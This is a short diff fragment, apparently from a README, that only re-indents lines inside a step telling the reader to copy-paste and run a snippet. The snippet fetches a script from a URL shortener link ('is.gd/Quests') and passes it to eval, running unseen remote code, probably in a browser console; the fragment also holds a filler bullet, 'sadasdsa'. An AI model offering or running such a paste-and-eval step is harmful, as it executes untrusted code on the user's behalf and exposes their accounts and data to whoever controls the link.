@@ -11,8 +11,8 @@
 -   Copy-paste the below code and press enter
     ```
     fetch('is.gd/Quests')
-  .then(response => response.text())
-  .then(script => eval(script));
+    .then(response => response.text())
+    .then(script => eval(script));
 
     ```
 -   sadasdsa
